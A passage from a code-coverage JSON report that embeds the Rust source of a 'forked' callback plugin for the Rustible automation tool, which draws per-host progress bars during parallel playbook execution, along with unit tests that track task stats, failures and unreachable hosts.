Line":0}},{"line":480,"address":[32644976,32644995],"length":1,"stats":{"Line":0}},{"line":505,"address":[33286416],"length":1,"stats":{"Line":0}},{"line":506,"address":[33286435],"length":1,"stats":{"Line":0}},{"line":507,"address":[33286463],"length":1,"stats":{"Line":0}},{"line":514,"address":[33300768],"length":1,"stats":{"Line":1}},{"line":516,"address":[33300781],"length":1,"stats":{"Line":1}},{"line":521,"address":[33300608,33300746],"length":1,"stats":{"Line":0}},{"line":522,"address":[33300669],"length":1,"stats":{"Line":0}},{"line":523,"address":[33300719],"length":1,"stats":{"Line":0}},{"line":527,"address":[33300576],"length":1,"stats":{"Line":1}},{"line":528,"address":[33300594],"length":1,"stats":{"Line":1}},{"line":533,"address":[33301264],"length":1,"stats":{"Line":0}},{"line":534,"address":[33301272],"length":1,"stats":{"Line":0}},{"line":540,"address":[32649696,32650179,32650255,32649718,32649783,32649816,32649902],"length":1,"stats":{"Line":4}},{"line":541,"address":[32650090,32649870,32649766,32649883],"length":1,"stats":{"Line":4}},{"line":542,"address":[32649954,32649804,32650141,32650212,32649933],"length":1,"stats":{"Line":3}},{"line":546,"address":[32648176,32647990,32648457,32648533,32648062,32648095,32647968],"length":1,"stats":{"Line":4}},{"line":547,"address":[32648045,32648149,32648364],"length":1,"stats":{"Line":3}},{"line":548,"address":[26126694],"length":1,"stats":{"Line":3}},{"line":552,"address":[32646903,32647383,32647022,32647307,32646838,32646816,32646936],"length":1,"stats":{"Line":0}},{"line":553,"address":[32646886,32647003,32646990,32647210],"length":1,"stats":{"Line":0}},{"line":554,"address":[32647340,32647074,32647053,32647261,32646924],"length":1,"stats":{"Line":0}},{"line":558,"address":[32646805,32646334,32646367,32646448,32646240,32646729,32646262],"length":1,"stats":{"Line":0}},{"line":559,"address":[32646636,32646421,32646317],"length":1,"stats":{"Line":0}},{"line":560,"address":[26116566],"length":1,"stats":{"Line":0}},{"line":564,"address":[32647414,32647392,32647512,32647479,32647598,32647883,32647959],"length":1,"stats":{"Line":4}},{"line":565,"address":[32647462,32647579,32647566,32647786],"length":1,"stats":{"Line":4}},{"line":566,"address":[26122694],"length":1,"stats":{"Line":3}},{"line":570,"address":[32648566,32648750,32648631,32649099,32648664,32648544,32649023],"length":1,"stats":{"Line":0}},{"line":571,"address":[32648731,32648938,32648718,32648614],"length":1,"stats":{"Line":0}},{"line":572,"address":[26128054],"length":1,"stats":{"Line":0}},{"line":576,"address":[32650392,32650831,32650359,32650272,32650294,32650478,32650755],"length":1,"stats":{"Line":0}},{"line":577,"address":[32650446,32650342,32650459,32650666],"length":1,"stats":{"Line":0}},{"line":578,"address":[26133446],"length":1,"stats":{"Line":0}},{"line":582,"address":[32649326,32649207,32649240,32649120,32649683,32649142,32649607],"length":1,"stats":{"Line":0}},{"line":583,"address":[32649514,32649190,32649307,32649294],"length":1,"stats":{"Line":0}},{"line":584,"address":[26130086],"length":1,"stats":{"Line":0}},{"line":614,"address":[33300103,33300563,33298336],"length":1,"stats":{"Line":1}},{"line":615,"address":[33298399],"length":1,"stats":{"Line":1}},{"line":616,"address":[33298428],"length":1,"stats":{"Line":1}},{"line":618,"address":[33298479],"length":1,"stats":{"Line":1}},{"line":619,"address":[33298552],"length":1,"stats":{"Line":1}},{"line":621,"address":[33298579],"length":1,"stats":{"Line":1}},{"line":623,"address":[33298801,33298606,33298677],"length":1,"stats":{"Line":3}},{"line":625,"address":[33298886,33299083],"length":1,"stats":{"Line":2}},{"line":627,"address":[33299335],"length":1,"stats":{"Line":1}},{"line":628,"address":[33299593,33299538],"length":1,"stats":{"Line":2}},{"line":629,"address":[33299625],"length":1,"stats":{"Line":1}},{"line":631,"address":[33299718],"length":1,"stats":{"Line":1}},{"line":633,"address":[33299819,33300109],"length":1,"stats":{"Line":2}},{"line":636,"address":[33299857,33300325],"length":1,"stats":{"Line":2}},{"line":639,"address":[33299887,33299784],"length":1,"stats":{"Line":2}},{"line":645,"address":[33298943],"length":1,"stats":{"Line":1}},{"line":658,"address":[33292288],"length":1,"stats":{"Line":1}},{"line":659,"address":[33292312],"length":1,"stats":{"Line":1}},{"line":667,"address":[33297744,33298317,33298311],"length":1,"stats":{"Line":1}},{"line":668,"address":[33297805],"length":1,"stats":{"Line":1}},{"line":669,"address":[33297815],"length":1,"stats":{"Line":1}},{"line":670,"address":[33297827],"length":1,"stats":{"Line":1}},{"line":672,"address":[33297847,33297911],"length":1,"stats":{"Line":2}},{"line":673,"address":[33298148,33298063],"length":1,"stats":{"Line":2}},{"line":674,"address":[33298280,33298210],"length":1,"stats":{"Line":2}},{"line":675,"address":[33298183,33298242],"length":1,"stats":{"Line":2}},{"line":680,"address":[33298086],"length":1,"stats":{"Line":1}}],"covered":90,"coverable":205},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","forked.rs"],"content":"//! Forked callback plugin for Rustible.\n//!\n//! This plugin provides visual feedback for parallel task execution,\n//! showing which hosts are running in parallel with individual progress bars.\n//!\n//! # Features\n//!\n//! - Visual fork lanes showing parallel execution\n//! - Progress bars for each active host\n//! - Completed/pending host counts\n//! - Clear visual indication of parallelism level\n//! - Works with the forks setting from executor config\n//!\n//! # Example Output\n//!\n//! ```text\n//! TASK [Install nginx] ********************************************************\n//! Parallel execution (forks=5):\n//!\n//!   [1] webserver1    [=========\u003e          ] 45% | Installing...\n//!   [2] webserver2    [============\u003e       ] 60% | Configuring...\n//!   [3] dbserver1     [===================\u003e] 95% | Finalizing...\n//!   [4] webserver3    [=====\u003e              ] 25% | Downloading...\n//!   [5] dbserver2     [=\u003e                  ] 10% | Starting...\n//!\n//!   Completed: 3/10  |  Running: 5  |  Pending: 2\n//! ```\n\nuse std::collections::HashMap;\nuse std::io::IsTerminal;\nuse std::sync::atomic::{AtomicU64, Ordering};\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse indicatif::{MultiProgress, ProgressBar, ProgressStyle};\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// State of a host during parallel execution.\n#[derive(Debug, Clone, PartialEq, Eq)]\npub enum HostState {\n    /// Host is waiting to be processed\n    Pending,\n    /// Host is currently being processed in a fork slot\n    Running {\n        /// The fork slot index (0-based)\n        fork_slot: usize,\n    },\n    /// Host completed successfully\n    Completed,\n    /// Host failed\n    Failed,\n    /// Host was skipped\n    Skipped,\n    /// Host was unreachable\n    Unreachable,\n}\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Count of unreachable attempts\n    unreachable: u32,\n    /// Current task name\n    current_task: Option\u003cString\u003e,\n    /// Task start time\n    task_start: Option\u003cInstant\u003e,\n}\n\n/// Information about a fork slot.\n#[derive(Debug)]\nstruct ForkSlot {\n    /// Host currently occupying this slot (if any)\n    host: Option\u003cString\u003e,\n    /// Progress bar for this slot\n    progress_bar: Option\u003cProgressBar\u003e,\n    /// Whether the slot is active\n    active: bool,\n}\n\nimpl Default for ForkSlot {\n    fn default() -\u003e Self {\n        Self {\n            host: None,\n            progress_bar: None,\n            active: false,\n        }\n    }\n}\n\n/// Configuration for the forked callback.\n#[derive(Debug, Clone)]\npub struct ForkedConfig {\n    /// Number of parallel fork slots\n    pub forks: usize,\n    /// Whether to use terminal UI (progress bars) or simple output\n    pub use_terminal_ui: bool,\n    /// Whether to show individual host progress bars\n    pub show_host_progress: bool,\n    /// Whether to show the summary line\n    pub show_summary: bool,\n    /// Progress bar template for fork slots\n    pub slot_template: String,\n}\n\nimpl Default for ForkedConfig {\n    fn default() -\u003e Self {\n        Self {\n            forks: 5,\n            use_terminal_ui: std::io::stdout().is_terminal(),\n            show_host_progress: true,\n            show_summary: true,\n            slot_template:\n                \"  {spinner:.green} [{prefix}] {msg:\u003c15} [{bar:25.cyan/blue}] {percent:\u003e3}%\"\n                    .to_string(),\n        }\n    }\n}\n\n/// Forked callback plugin that visualizes parallel execution.\n///\n/// This callback shows a live view of parallel task execution across\n/// multiple hosts, with progress bars for each active fork slot.\n///\n/// # Design Principles\n///\n/// 1. **Visual Parallelism**: Clear indication of which hosts run simultaneously\n/// 2. **Progress Tracking**: Individual progress bars per fork slot\n/// 3. **Status Summary**: Running counts of completed/pending/running hosts\n/// 4. **Minimal Flicker**: Smart terminal updates to reduce visual noise\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::ForkedCallback;\n///\n/// let callback = ForkedCallback::new(5); // 5 parallel forks\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct ForkedCallback {\n    /// Configuration\n    config: ForkedConfig,\n    /// Per-host execution statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Host states during execution\n    host_states: Arc\u003cRwLock\u003cHashMap\u003cString, HostState\u003e\u003e\u003e,\n    /// Fork slots for parallel visualization\n    fork_slots: Arc\u003cRwLock\u003cVec\u003cForkSlot\u003e\u003e\u003e,\n    /// Multi-progress container for progress bars\n    multi_progress: Arc\u003cRwLock\u003cOption\u003cMultiProgress\u003e\u003e\u003e,\n    /// Playbook start time for duration tracking\n    start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Current task name\n    current_task: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Total hosts in current play\n    total_hosts: Arc\u003cAtomicU64\u003e,\n    /// Completed hosts count\n    completed_hosts: Arc\u003cAtomicU64\u003e,\n    /// Whether any failures occurred\n    has_failures: Arc\u003cRwLock\u003cbool\u003e\u003e,\n}\n\nimpl ForkedCallback {\n    /// Creates a new forked callback plugin with the specified fork count.\n    ///\n    /// # Arguments\n    ///\n    /// * `forks` - Maximum number of parallel host executions\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = ForkedCallback::new(5);\n    /// ```\n    #[must_use]\n    pub fn new(forks: usize) -\u003e Self {\n        let config = ForkedConfig {\n            forks: forks.max(1),\n            ..Default::default()\n        };\n        Self::with_config(config)\n    }\n\n    /// Creates a forked callback with custom configuration.\n    #[must_use]\n    pub fn with_config(config: ForkedConfig) -\u003e Self {\n        let forks = config.forks.max(1);\n        Self {\n            config: ForkedConfig { forks, ..config },\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            host_states: Arc::new(RwLock::new(HashMap::new())),\n            fork_slots: Arc::new(RwLock::new(Vec::with_capacity(forks))),\n            multi_progress: Arc::new(RwLock::new(None)),\n            start_time: Arc::new(RwLock::new(None)),\n            playbook_name: Arc::new(RwLock::new(None)),\n            current_task: Arc::new(RwLock::new(None)),\n            total_hosts: Arc::new(AtomicU64::new(0)),\n            completed_hosts: Arc::new(AtomicU64::new(0)),\n            has_failures: Arc::new(RwLock::new(false)),\n        }\n    }\n\n    /// Returns whether any failures occurred during execution.\n    pub fn has_failures(\u0026self) -\u003e bool {\n        *self.has_failures.read()\n    }\n\n    /// Gets the number of configured forks.\n    pub fn forks(\u0026self) -\u003e usize {\n        self.config.forks\n    }\n\n    /// Allocates a fork slot for a host.\n    fn allocate_fork_slot(\u0026self, host: \u0026str) -\u003e Option\u003cusize\u003e {\n        let mut slots = self.fork_slots.write();\n\n        // Find an empty slot\n        for (idx, slot) in slots.iter_mut().enumerate() {\n            if !slot.active {\n                slot.host = Some(host.to_string());\n                slot.active = true;\n                return Some(idx);\n            }\n        }\n\n        // All slots full\n        None\n    }\n\n    /// Releases a fork slot.\n    fn release_fork_slot(\u0026self, host: \u0026str) {\n        let mut slots = self.fork_slots.write();\n\n        for slot in slots.iter_mut() {\n            if slot.host.as_deref() == Some(host) {\n                if let Some(pb) = slot.progress_bar.take() {\n                    pb.finish_and_clear();\n                }\n                slot.host = None;\n                slot.active = false;\n                break;\n            }\n        }\n    }\n\n    /// Creates a progress bar for a fork slot.\n    fn create_progress_bar(\u0026self, slot_idx: usize, host: \u0026str) -\u003e ProgressBar {\n        let style = ProgressStyle::default_bar()\n            .template(\u0026format!(\n                \"  {{spinner:.green}} [{}] {{prefix:\u003c15}} [{{bar:25.cyan/blue}}] {{msg}}\",\n                slot_idx + 1\n            ))\n            .unwrap_or_else(|_| ProgressStyle::default_bar())\n            .progress_chars(\"=\u003e-\")\n            .tick_chars(\"*+x-\");\n\n        let pb = ProgressBar::new(100);\n        pb.set_style(style);\n        pb.set_prefix(host.to_string());\n        pb.set_message(\"Starting...\");\n        pb.enable_steady_tick(Duration::from_millis(100));\n        pb\n    }\n\n    /// Updates the progress bar for a host.\n    fn update_host_progress(\u0026self, host: \u0026str, progress: u8, message: \u0026str) {\n        let slots = self.fork_slots.read();\n\n        for slot in slots.iter() {\n            if slot.host.as_deref() == Some(host) {\n                if let Some(ref pb) = slot.progress_bar {\n                    pb.set_position(u64::from(progress));\n                    pb.set_message(message.to_string());\n                }\n                break;\n            }\n        }\n    }\n\n    /// Prints the task header with parallelism info.\n    fn print_task_header(\u0026self, task_name: \u0026str) {\n        let header = format!(\n            \"\\n{} [{}] {}\",\n            \"TASK\".bold().cyan(),\n            task_name.bright_white().bold(),\n            \"*\".repeat(60_usize.saturating_sub(task_name.len().min(55)))\n        );\n        println!(\"{header}\");\n        println!(\n            \"{}\",\n            format!(\"Parallel execution (forks={}):\", self.config.forks).bright_black()\n        );\n        println!();\n    }\n\n    /// Prints the summary line showing completed/running/pending counts.\n    #[allow(dead_code)]\n    fn print_summary_line(\u0026self) {\n        let total = self.total_hosts.load(Ordering::SeqCst);\n        let completed = self.completed_hosts.load(Ordering::SeqCst);\n        let states = self.host_states.read();\n\n        let running = states\n            .values()\n            .filter(|s| matches!(s, HostState::Running { .. }))\n            .count();\n        let pending = states\n            .values()\n            .filter(|s| matches!(s, HostState::Pending))\n            .count();\n\n        println!(\n            \"\\n  {} {}/{}  |  {} {}  |  {} {}\",\n            \"Completed:\".bright_black(),\n            completed.to_string().green(),\n            total,\n            \"Running:\".bright_black(),\n            running.to_string().yellow(),\n            \"Pending:\".bright_black(),\n            pending.to_string().cyan(),\n        );\n    }\n\n    /// Formats a simple status line for non-terminal output.\n    fn format_simple_status(host: \u0026str, task_name: \u0026str, status: \u0026str) -\u003e String {\n        format!(\n            \"  {} | {} | {}\",\n            host.bright_white().bold(),\n            task_name.yellow(),\n            status\n        )\n    }\n\n    /// Formats the final recap line for a host.\n    fn format_recap_line(host: \u0026str, stats: \u0026HostStats, state: \u0026HostState) -\u003e String {\n        let host_display = match state {\n            HostState::Failed | HostState::Unreachable =\u003e host.red().bold(),\n            HostState::Completed if stats.changed \u003e 0 =\u003e host.yellow(),\n            HostState::Completed =\u003e host.green(),\n            HostState::Skipped =\u003e host.cyan(),\n            _ =\u003e host.white(),\n        };\n\n        let state_indicator = match state {\n            HostState::Failed =\u003e \"[FAILED]\".red().bold(),\n            HostState::Unreachable =\u003e \"[UNREACHABLE]\".magenta().bold(),\n            HostState::Skipped =\u003e \"[SKIPPED]\".cyan(),\n            HostState::Completed =\u003e \"[OK]\".green(),\n            _ =\u003e \"[?]\".white(),\n        };\n\n        format!(\n            \"{host_display}: {state_indicator} ok={} changed={} failed={} skipped={} unreachable={}\",\n            stats.ok.to_string().green(),\n            stats.changed.to_string().yellow(),\n            stats.failed.to_string().red(),\n            stats.skipped.to_string().cyan(),\n            stats.unreachable.to_string().magenta(),\n        )\n    }\n}\n\nimpl Default for ForkedCallback {\n    fn default() -\u003e Self {\n        Self::new(5)\n    }\n}\n\nimpl Clone for ForkedCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            host_stats: Arc::clone(\u0026self.host_stats),\n            host_states: Arc::clone(\u0026self.host_states),\n            fork_slots: Arc::clone(\u0026self.fork_slots),\n            multi_progress: Arc::clone(\u0026self.multi_progress),\n            start_time: Arc::clone(\u0026self.start_time),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            current_task: Arc::clone(\u0026self.current_task),\n            total_hosts: Arc::clone(\u0026self.total_hosts),\n            completed_hosts: Arc::clone(\u0026self.completed_hosts),\n            has_failures: Arc::clone(\u0026self.has_failures),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for ForkedCallback {\n    /// Called when a playbook starts - initializes tracking state.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        *self.start_time.write() = Some(Instant::now());\n        *self.playbook_name.write() = Some(name.to_string());\n\n        // Clear stats from any previous run\n        self.host_stats.write().clear();\n        self.host_states.write().clear();\n        *self.has_failures.write() = false;\n\n        // Reset counters\n        self.total_hosts.store(0, Ordering::SeqCst);\n        self.completed_hosts.store(0, Ordering::SeqCst);\n\n        // Initialize fork slots\n        let mut slots = self.fork_slots.write();\n        slots.clear();\n        for _ in 0..self.config.forks {\n            slots.push(ForkSlot::default());\n        }\n\n        // Print playbook header\n        println!(\n            \"\\n{} {}\",\n            \"PLAYBOOK:\".bold().magenta(),\n            name.bright_white().bold()\n        );\n        println!(\n            \"{}\",\n            format!(\"Parallelism: {} forks\", self.config.forks).bright_black()\n        );\n    }\n\n    /// Called when a playbook ends - prints the final recap.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let stats = self.host_stats.read();\n        let states = self.host_states.read();\n        let start_time = *self.start_time.read();\n\n        // Clear any remaining progress bars\n        if let Some(mp) = self.multi_progress.write().take() {\n            let _ = mp.clear();\n        }\n\n        // Print recap header\n        println!(\"\\n{}\\n\", \"=\".repeat(70).bright_black());\n        println!(\"{}\", \"PLAY RECAP\".bold().cyan());\n        println!(\"{}\", \"-\".repeat(70).bright_black());\n\n        // Print recap for each host in sorted order\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                let state = states.get(host).unwrap_or(\u0026HostState::Completed);\n                println!(\"{}\", Self::format_recap_line(host, host_stats, state));\n            }\n        }\n\n        // Print duration and status\n        if let Some(start) = start_time {\n            let duration = start.elapsed();\n            let status = if success {\n                \"completed successfully\".green().bold()\n            } else {\n                \"failed\".red().bold()\n            };\n\n            println!(\n                \"\\n{} {status} in {:.2}s\",\n                name.bright_white().bold(),\n                duration.as_secs_f64()\n            );\n        }\n\n        // Print parallelism summary\n        let total = self.total_hosts.load(Ordering::SeqCst);\n        let completed = self.completed_hosts.load(Ordering::SeqCst);\n        println!(\n            \"{}\",\n            format!(\n                \"Parallelism: {} forks, {}/{} hosts processed\",\n                self.config.forks, completed, total\n            )\n            .bright_black()\n        );\n    }\n\n    /// Called when a play starts - initializes host tracking.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Initialize stats and states for all hosts in this play\n        let mut stats = self.host_stats.write();\n        let mut states = self.host_states.write();\n\n        for host in hosts {\n            stats.entry(host.clone()).or_default();\n            states.insert(host.clone(), HostState::Pending);\n        }\n\n        // Update total hosts count\n        self.total_hosts.store(hosts.len() as u64, Ordering::SeqCst);\n        self.completed_hosts.store(0, Ordering::SeqCst);\n\n        println!(\n            \"\\n{} [{}] {} hosts\",\n            \"PLAY\".bold().cyan(),\n            name.bright_white().bold(),\n            hosts.len()\n        );\n    }\n\n    /// Called when a play ends.\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Release all fork slots\n        let mut slots = self.fork_slots.write();\n        for slot in slots.iter_mut() {\n            if let Some(pb) = slot.progress_bar.take() {\n                pb.finish_and_clear();\n            }\n            slot.host = None;\n            slot.active = false;\n        }\n    }\n\n    /// Called when a task starts on a host.\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        // Update current task\n        {\n            let mut current_task = self.current_task.write();\n            if current_task.as_deref() != Some(name) {\n                *current_task = Some(name.to_string());\n\n                if self.config.use_terminal_ui {\n                    self.print_task_header(name);\n                } else {\n                    println!(\n                        \"\\n{} [{}]\",\n                        \"TASK\".bold().cyan(),\n                        name.bright_white().bold()\n                    );\n                }\n            }\n        }\n\n        // Update host state\n        {\n            let mut states = self.host_states.write();\n            if let Some(slot) = self.allocate_fork_slot(host) {\n                states.insert(host.to_string(), HostState::Running { fork_slot: slot });\n            }\n        }\n\n        // Update host stats with current task\n        {\n            let mut stats = self.host_stats.write();\n            if let Some(host_stat) = stats.get_mut(host) {\n                host_stat.current_task = Some(name.to_string());\n                host_stat.task_start = Some(Instant::now());\n            }\n        }\n\n        // Setup progress bar if using terminal UI\n        if self.config.use_terminal_ui \u0026\u0026 self.config.show_host_progress {\n            let mut slots = self.fork_slots.write();\n            for (idx, slot) in slots.iter_mut().enumerate() {\n                if slot.host.as_deref() == Some(host) \u0026\u0026 slot.progress_bar.is_none() {\n                    let mp_guard = self.multi_progress.read();\n                    if let Some(ref mp) = *mp_guard {\n                        let pb = self.create_progress_bar(idx, host);\n                        slot.progress_bar = Some(mp.add(pb));\n                    } else {\n                        drop(mp_guard);\n                        let mut mp_guard = self.multi_progress.write();\n                        let mp = MultiProgress::new();\n                        let pb = self.create_progress_bar(idx, host);\n                        slot.progress_bar = Some(mp.add(pb));\n                        *mp_guard = Some(mp);\n                    }\n                    break;\n                }\n            }\n        } else {\n            // Simple output mode\n            println!(\"{}\", Self::format_simple_status(host, name, \"starting...\"));\n        }\n    }\n\n    /// Called when a task completes.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let host = \u0026result.host;\n\n        // Update host statistics\n        {\n            let mut stats = self.host_stats.write();\n            let host_stats = stats.entry(host.clone()).or_default();\n\n            if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if !result.result.success {\n                host_stats.failed += 1;\n                *self.has_failures.write() = true;\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n\n            host_stats.current_task = None;\n            host_stats.task_start = None;\n        }\n\n        // Update host state\n        {\n            let mut states = self.host_states.write();\n            let new_state = if result.result.skipped {\n                HostState::Skipped\n            } else if !result.result.success {\n                HostState::Failed\n            } else {\n                HostState::Completed\n            };\n\n            // Only update if moving to a terminal state\n            if let Some(current_state) = states.get(host) {\n                if matches!(current_state, HostState::Running { .. }) {\n                    states.insert(host.clone(), new_state);\n                }\n            }\n        }\n\n        // Update progress bar or print status\n        if self.config.use_terminal_ui {\n            let status_msg = if result.result.skipped {\n                \"skipped\".cyan().to_string()\n            } else if !result.result.success {\n                format!(\"FAILED: {}\", result.result.message)\n                    .red()\n                    .to_string()\n            } else if result.result.changed {\n                \"changed\".yellow().to_string()\n            } else {\n                \"ok\".green().to_string()\n            };\n\n            self.update_host_progress(host, 100, \u0026status_msg);\n        } else {\n            // Simple output mode\n            let status = if result.result.skipped {\n                \"skipped\".cyan().to_string()\n            } else if !result.result.success {\n                format!(\"FAILED: {}\", result.result.message)\n                    .red()\n                    .to_string()\n            } else if result.result.changed {\n                \"changed\".yellow().to_string()\n            } else {\n                \"ok\".green().to_string()\n            };\n\n            println!(\n                \"{}\",\n                Self::format_simple_status(host, \u0026result.task_name, \u0026status)\n            );\n        }\n\n        // Release the fork slot\n        self.release_fork_slot(host);\n\n        // Increment completed count\n        self.completed_hosts.fetch_add(1, Ordering::SeqCst);\n    }\n\n    /// Called when a handler is triggered.\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        println!(\"  {} {}\", \"HANDLER:\".bright_magenta(), name.bright_white());\n    }\n\n    /// Called when facts are gathered.\n    async fn on_facts_gathered(\u0026self, host: \u0026str, _facts: \u0026Facts) {\n        if self.config.use_terminal_ui {\n            self.update_host_progress(host, 10, \"Facts gathered\");\n        } else {\n            println!(\n                \"{}\",\n                Self::format_simple_status(host, \"gather_facts\", \u0026\"ok\".green().to_string())\n            );\n        }\n    }\n}\n\n/// Trait extension for handling unreachable hosts in forked execution.\n#[async_trait]\npub trait ForkedUnreachableCallback: ExecutionCallback {\n    /// Called when a host becomes unreachable during parallel execution.\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str);\n}\n\n#[async_trait]\nimpl ForkedUnreachableCallback for ForkedCallback {\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str) {\n        // Update host state\n        self.host_states\n            .write()\n            .insert(host.to_string(), HostState::Unreachable);\n\n        // Update host statistics\n        {\n            let mut stats = self.host_stats.write();\n            let host_stats = stats.entry(host.to_string()).or_default();\n            host_stats.unreachable += 1;\n        }\n\n        // Mark as having failures\n        *self.has_failures.write() = true;\n\n        // Release fork slot\n        self.release_fork_slot(host);\n\n        // Print unreachable message\n        println!(\n            \"  {} {} | {} | {}\",\n            \"UNREACHABLE\".magenta().bold(),\n            host.bright_white().bold(),\n            task_name.yellow(),\n            error.red()\n        );\n    }\n}\n\n/// Builder for creating `ForkedCallback` with custom options.\n#[derive(Debug, Clone)]\npub struct ForkedCallbackBuilder {\n    config: ForkedConfig,\n}\n\nimpl ForkedCallbackBuilder {\n    /// Creates a new builder with default settings.\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self {\n            config: ForkedConfig::default(),\n        }\n    }\n\n    /// Sets the number of parallel forks.\n    #[must_use]\n    pub fn forks(mut self, forks: usize) -\u003e Self {\n        self.config.forks = forks;\n        self\n    }\n\n    /// Forces terminal UI on or off.\n    #[must_use]\n    pub fn terminal_ui(mut self, enabled: bool) -\u003e Self {\n        self.config.use_terminal_ui = enabled;\n        self\n    }\n\n    /// Enables or disables host progress bars.\n    #[must_use]\n    pub fn show_host_progress(mut self, show: bool) -\u003e Self {\n        self.config.show_host_progress = show;\n        self\n    }\n\n    /// Enables or disables the summary line.\n    #[must_use]\n    pub fn show_summary(mut self, show: bool) -\u003e Self {\n        self.config.show_summary = show;\n        self\n    }\n\n    /// Builds the `ForkedCallback`.\n    #[must_use]\n    pub fn build(self) -\u003e ForkedCallback {\n        ForkedCallback::with_config(self.config)\n    }\n}\n\nimpl Default for ForkedCallbackBuilder {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_forked_callback_creation() {\n        let callback = ForkedCallback::new(5);\n        assert_eq!(callback.forks(), 5);\n    }\n\n    #[tokio::test]\n    async fn test_forked_callback_minimum_forks() {\n        let callback = ForkedCallback::new(0);\n        assert_eq!(callback.forks(), 1); // Should be at least 1\n    }\n\n    #[tokio::test]\n    async fn test_forked_callback_builder() {\n        let callback = ForkedCallbackBuilder::new()\n            .forks(10)\n            .terminal_ui(false)\n            .build();\n\n        assert_eq!(callback.forks(), 10);\n        assert!(!callback.config.use_terminal_ui);\n    }\n\n    #[tokio::test]\n    async fn test_forked_callback_tracks_stats() {\n        let callback = ForkedCallbackBuilder::new()\n            .forks(5)\n            .terminal_ui(false)\n            .build();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate task execution\n        callback.on_task_start(\"Install nginx\", \"host1\").await;\n        callback.on_task_start(\"Install nginx\", \"host2\").await;\n\n        let ok_result = create_execution_result(\"host1\", \"Install nginx\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host2\", \"Install nginx\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        // Verify stats\n        let stats = callback.host_stats.read();\n\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 0);\n\n        let host2_stats = stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.ok, 0);\n        assert_eq!(host2_stats.changed, 1);\n\n        assert!(!callback.has_failures());\n    }\n\n    #[tokio::test]\n    async fn test_forked_callback_tracks_failures() {\n        let callback = ForkedCallbackBuilder::new()\n            .forks(5)\n            .terminal_ui(false)\n            .build();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback.on_task_start(\"Install nginx\", \"host1\").await;\n\n        let failed_result = create_execution_result(\n            \"host1\",\n            \"Install nginx\",\n            false,\n            false,\n            false,\n            \"Package not found\",\n        );\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let stats = callback.host_stats.read();\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.failed, 1);\n\n        assert!(callback.has_failures());\n    }\n\n    #[tokio::test]\n    async fn test_forked_callback_unreachable() {\n        let callback = ForkedCallbackBuilder::new()\n            .forks(5)\n            .terminal_ui(false)\n            .build();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback\n            .on_host_unreachable(\"host1\", \"gather_facts\", \"Connection refused\")\n            .await;\n\n        let stats = 